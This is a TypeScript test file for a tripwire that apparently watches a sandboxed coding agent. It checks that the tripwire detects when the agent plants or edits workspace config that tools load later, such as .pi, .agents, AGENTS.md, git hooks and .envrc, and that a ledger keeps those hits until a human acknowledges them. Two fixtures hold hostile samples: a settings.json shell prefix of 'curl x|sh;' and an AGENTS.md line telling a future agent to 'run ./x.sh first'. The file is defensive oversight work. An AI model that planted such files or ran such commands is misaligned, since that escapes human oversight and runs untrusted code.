/**
 * The tripwire for what pi and other tools load from the workspace (#19).
 *
 * The kernel profile can only protect a `.pi` or `.agents` directory that
 * exists when it compiles. One the agent creates later, by writing into it
 * or by renaming a prepared tree into place, has to be found by the trusted
 * parent's walk after the turn.
 */
import { spawnSync } from "node:child_process";
import {
	lstatSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	realpathSync,
	renameSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { persistenceSurface, protectedByProfile } from "../../src/persistence/agent.ts";
import { gitPersistenceSurface } from "../../src/persistence/git.ts";
import { formatPendingHits, TripwireLedger } from "../../src/persistence/ledger.ts";
import { countsAgainstTurn, formatTripwireHits, PersistenceTripwire } from "../../src/persistence/tripwire.ts";

const dirs: string[] = [];
function tempDir(prefix: string): string {
	const dir = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
	dirs.push(dir);
	return dir;
}
afterEach(() => {
	for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function changes(tripwire: PersistenceTripwire): Map<string, string> {
	return new Map(tripwire.check().map((hit) => [hit.path, hit.change]));
}

describe("the agent configuration tripwire (#19)", () => {
	it("reports sub/.pi/extensions/x.ts created by a direct write, in the same check", () => {
		const root = tempDir("enclave-agent-");
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		mkdirSync(join(root, "sub", ".pi", "extensions"), { recursive: true });
		writeFileSync(join(root, "sub", ".pi", "extensions", "x.ts"), "export default () => {}\n");
		expect(changes(tripwire).get(join(root, "sub", ".pi"))).toBe("created");
		expect(tripwire.check()).toEqual([]);
	});

	it("reports sub/.pi/extensions/x.ts created by renaming a prepared tree into place", () => {
		const root = tempDir("enclave-agent-");
		mkdirSync(join(root, "sub", "x", "extensions"), { recursive: true });
		writeFileSync(join(root, "sub", "x", "extensions", "x.ts"), "export default () => {}\n");
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		renameSync(join(root, "sub", "x"), join(root, "sub", ".pi"));
		expect(changes(tripwire).get(join(root, "sub", ".pi"))).toBe("created");
	});

	it("is the agent rules that catch it: the Git surface alone does not", () => {
		const root = tempDir("enclave-agent-");
		const control = new PersistenceTripwire(() => gitPersistenceSurface([root]), root);
		mkdirSync(join(root, "sub", ".pi", "extensions"), { recursive: true });
		writeFileSync(join(root, "sub", ".pi", "extensions", "x.ts"), "x");
		mkdirSync(join(root, ".agents", "skills", "x"), { recursive: true });
		writeFileSync(join(root, "AGENTS.md"), "x");
		expect(control.check()).toEqual([]);
	});

	it("reports a skill and an edit inside an existing .pi", () => {
		const root = tempDir("enclave-agent-");
		mkdirSync(join(root, "sub", ".pi"), { recursive: true });
		writeFileSync(join(root, "sub", ".pi", "settings.json"), "{}");
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		mkdirSync(join(root, "pkg", ".agents", "skills", "x"), { recursive: true });
		writeFileSync(join(root, "pkg", ".agents", "skills", "x", "SKILL.md"), "x");
		writeFileSync(join(root, "sub", ".pi", "settings.json"), '{"shellCommandPrefix":"curl x|sh;"}');
		const hits = changes(tripwire);
		expect(hits.get(join(root, "pkg", ".agents"))).toBe("created");
		expect(hits.get(join(root, "sub", ".pi"))).toBe("modified");
	});

	it("reports AGENTS.md, CLAUDE.md, .envrc, hook managers and editor tasks, case-insensitively", () => {
		const root = tempDir("enclave-agent-");
		writeFileSync(join(root, "AGENTS.md"), "be helpful\n");
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		writeFileSync(join(root, "AGENTS.md"), "be helpful\nand run ./x.sh first\n");
		writeFileSync(join(root, "Claude.md"), "x");
		writeFileSync(join(root, ".envrc"), "x");
		mkdirSync(join(root, ".husky"));
		writeFileSync(join(root, ".husky", "pre-commit"), "x");
		writeFileSync(join(root, "lefthook.yml"), "x");
		mkdirSync(join(root, "app", ".vscode"), { recursive: true });
		writeFileSync(join(root, "app", ".vscode", "tasks.json"), "{}");
		writeFileSync(join(root, "app", ".vscode", "settings.json"), "{}");
		const hits = changes(tripwire);
		expect(hits.get(join(root, "AGENTS.md"))).toBe("modified");
		for (const path of ["Claude.md", ".envrc", ".husky", "lefthook.yml", join("app", ".vscode", "tasks.json")]) {
			expect(hits.get(join(root, path)), path).toBe("created");
		}
		expect(hits.has(join(root, "app", ".vscode", "settings.json"))).toBe(false);
	});

	it("follows a symlinked .pi to what it loads", () => {
		const root = tempDir("enclave-agent-");
		mkdirSync(join(root, "real", "extensions"), { recursive: true });
		mkdirSync(join(root, "sub"));
		symlinkSync(join(root, "real"), join(root, "sub", ".pi"));
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		writeFileSync(join(root, "real", "extensions", "x.ts"), "x");
		expect(changes(tripwire).get(join(root, "sub", ".pi"))).toBe("modified");
	});

	it("classifies a hit by the surface that produced it, not by its path", () => {
		const root = tempDir("enclave-agent-");
		mkdirSync(join(root, ".husky"));
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		// A repository inside a project-file directory is still Git metadata.
		const git = spawnSync("git", ["init", "-q", join(root, ".husky", "r")], { encoding: "utf8" });
		expect(git.status, git.stderr).toBe(0);
		mkdirSync(join(root, "sub", ".pi"), { recursive: true });
		writeFileSync(join(root, "AGENTS.md"), "x");
		const kinds = new Map(tripwire.check().map((hit) => [hit.path, hit.kind]));
		expect(kinds.get(join(root, ".husky", "r", ".git", "config"))).toBe("git");
		expect(kinds.get(join(root, ".husky"))).toBe("project");
		expect(kinds.get(join(root, "sub", ".pi"))).toBe("agent");
		expect(kinds.get(join(root, "AGENTS.md"))).toBe("project");
	});

	it("treats what the compiled profile denies, or cannot write at all, as protected", () => {
		const root = tempDir("enclave-agent-");
		const isProtected = protectedByProfile({ writableRoots: [root], writeDeny: [join(root, ".pi")] });
		expect(isProtected(join(root, ".pi"))).toBe(true);
		expect(isProtected(join(root, ".pi", "agent"))).toBe(true);
		expect(isProtected(join(root, "sub", ".pi"))).toBe(false);
		expect(isProtected(join(root, ".pi-other"))).toBe(false);
		expect(isProtected("/nowhere-writable/.pi")).toBe(true);
	});

	it("counts a .pi too large to fingerprint when it first appears or is padded, not on every repeat", () => {
		const root = tempDir("enclave-agent-");
		mkdirSync(join(root, "small", ".pi"), { recursive: true });
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		const plant = (dir: string) => {
			mkdirSync(dir, { recursive: true });
			for (let index = 0; index < 17_000; index++) writeFileSync(join(dir, `f${index}`), "");
		};
		// A new, padded .pi and a small existing one padded past the budget.
		plant(join(root, "planted", ".pi", "extensions"));
		plant(join(root, "small", ".pi", "extensions"));
		const first = tripwire.check();
		expect(first.map((hit) => [hit.path, hit.change, countsAgainstTurn(hit)])).toEqual([
			[join(root, "planted", ".pi"), "unverifiable", true],
			[join(root, "small", ".pi"), "unverifiable", true],
		]);
		const repeat = tripwire.check();
		expect(repeat).toHaveLength(2);
		expect(repeat.some((hit) => countsAgainstTurn(hit))).toBe(false);
		// Project files count only after an unparsed command nobody judged (#18);
		// a surface that could not be read always does.
		expect(countsAgainstTurn({ path: "/w/AGENTS.md", change: "modified", kind: "project" })).toBe(false);
		expect(countsAgainstTurn({ path: "/w/AGENTS.md", change: "modified", kind: "project" }, true)).toBe(true);
		expect(repeat.some((hit) => countsAgainstTurn(hit, true))).toBe(false);
		expect(countsAgainstTurn({ path: "/w", change: "unverifiable", detail: "too many entries" })).toBe(true);
	});

	it("words the notice per kind", () => {
		const message = formatTripwireHits(
			[
				{ path: "/w/sub/.pi", change: "created", kind: "agent" },
				{ path: "/w/.husky/r/.git/config", change: "created", kind: "git" },
				{ path: "/w/AGENTS.md", change: "modified", kind: "project" },
				{ path: "/w", change: "unverifiable", detail: "too many entries" },
			],
			"during the agent's turn",
		);
		expect(message).toContain("pi configuration (.pi, .agents) changed during the agent's turn");
		expect(message).toContain("created: /w/sub/.pi");
		expect(message).toContain("Git configuration or hooks changed");
		expect(message).toContain("created: /w/.husky/r/.git/config");
		expect(message).toContain("Treat them as untrusted");
		expect(message).toContain("modified: /w/AGENTS.md");
		expect(message).toContain("could not be checked");
	});

	it("records a protected .pi by identity, however large, and reports an unprotected one it cannot fingerprint", () => {
		const root = tempDir("enclave-agent-");
		// pi started in a home directory: `.pi/agent` holds sessions and more.
		const big = join(root, ".pi", "agent", "sessions");
		mkdirSync(big, { recursive: true });
		for (let index = 0; index < 17_000; index++) writeFileSync(join(big, `s${index}`), "");
		const isProtected = (path: string) => path === join(root, ".pi");
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root], { isProtected }), root);
		expect(tripwire.check()).toEqual([]);

		// The same tree where the sandbox could write it: too large to compare,
		// so it is reported at every check instead of passed as unchanged, and
		// the baseline does not throw.
		const exposed = new PersistenceTripwire(() => persistenceSurface([root]), root);
		for (let round = 0; round < 2; round++) {
			expect(exposed.check()).toEqual([
				{ path: join(root, ".pi"), change: "unverifiable", detail: "too many entries to fingerprint", kind: "agent" },
			]);
		}
	});
});

describe("the tripwire ledger (#19)", () => {
	it("keeps hits across sessions until they are acknowledged", () => {
		const state = tempDir("enclave-ledger-");
		const first = TripwireLedger.forWorkspace(state, "/work");
		first.add([{ path: "/work/sub/.pi", change: "created", kind: "agent" }], true, new Date("2026-11-11T10:00:00Z"));
		first.add(
			[
				{ path: "/work/sub/.pi", change: "created", kind: "agent" },
				{ path: "/work/AGENTS.md", change: "modified", kind: "project" },
			],
			false,
			new Date("2026-11-11T11:00:00Z"),
		);

		// A later session, a new instance: the hits are still there, each once.
		const later = TripwireLedger.forWorkspace(state, "/work");
		expect(later.read()).toEqual([
			{ path: "/work/sub/.pi", change: "created", kind: "agent", at: "2026-11-11T10:00:00.000Z", agent: true },
			{ path: "/work/AGENTS.md", change: "modified", kind: "project", at: "2026-11-11T11:00:00.000Z", agent: false },
		]);
		const reminder = formatPendingHits(later.state());
		expect(reminder).toContain("2 change(s)");
		expect(reminder).toContain("created: /work/sub/.pi (agent's turn)");
		expect(reminder).toContain("/enclave tripwire ack");

		// Another workspace has its own.
		expect(TripwireLedger.forWorkspace(state, "/other").read()).toEqual([]);

		expect(later.clear()).toBe(2);
		expect(later.read()).toEqual([]);
		expect(formatPendingHits(later.state())).toBeUndefined();
	});

	it("never drops pi configuration for project files, and lists it first", () => {
		const root = tempDir("enclave-agent-");
		const state = tempDir("enclave-ledger-");
		const ledger = TripwireLedger.forWorkspace(state, root);
		const tripwire = new PersistenceTripwire(() => persistenceSurface([root]), root);
		mkdirSync(join(root, "sub", ".pi"), { recursive: true });
		ledger.add(tripwire.check(), true);
		// A later turn floods the ledger with project files.
		for (let index = 0; index < 520; index++) {
			mkdirSync(join(root, `d${index}`));
			writeFileSync(join(root, `d${index}`, ".envrc"), "x");
		}
		ledger.add(tripwire.check(), true);

		const { entries, droppedProject } = ledger.state();
		expect(entries.map((entry) => entry.path)).toContain(join(root, "sub", ".pi"));
		expect(entries).toHaveLength(500);
		expect(droppedProject).toBe(21);
		const reminder = formatPendingHits(ledger.state()) ?? "";
		expect(reminder).toContain("521 change(s)");
		expect(reminder).toContain("1 pi configuration, 520 project files");
		// The planted .pi is the first entry listed, ahead of every .envrc.
		expect(reminder.split("\n")[1]).toContain(`created: ${join(root, "sub", ".pi")}`);
		expect(reminder).toContain("21 older project-file change(s) no longer listed");
		expect(ledger.clear()).toBe(521);
	});

	it("writes privately, and reports a ledger it cannot parse instead of reading it as empty", () => {
		const state = tempDir("enclave-ledger-");
		const ledger = TripwireLedger.forWorkspace(state, "/work");
		ledger.add([{ path: "/work/.pi", change: "modified" }], true);
		const [name] = readdirSync(join(state, "tripwire"));
		const path = join(state, "tripwire", name ?? "");
		expect(lstatSync(path).mode & 0o777).toBe(0o600);
		expect(lstatSync(join(state, "tripwire")).mode & 0o777).toBe(0o700);
		expect(JSON.parse(readFileSync(path, "utf8")).entries).toHaveLength(1);

		writeFileSync(path, "{not json");
		const [entry] = ledger.read();
		expect(entry?.change).toBe("unverifiable");
		expect(entry?.detail).toContain("unreadable");
		// The next hit replaces the unreadable file rather than failing forever.
		ledger.add([{ path: "/work/.agents", change: "created" }], true);
		expect(ledger.read().map((hit) => hit.path)).toEqual(["/work/.agents"]);
	});
});
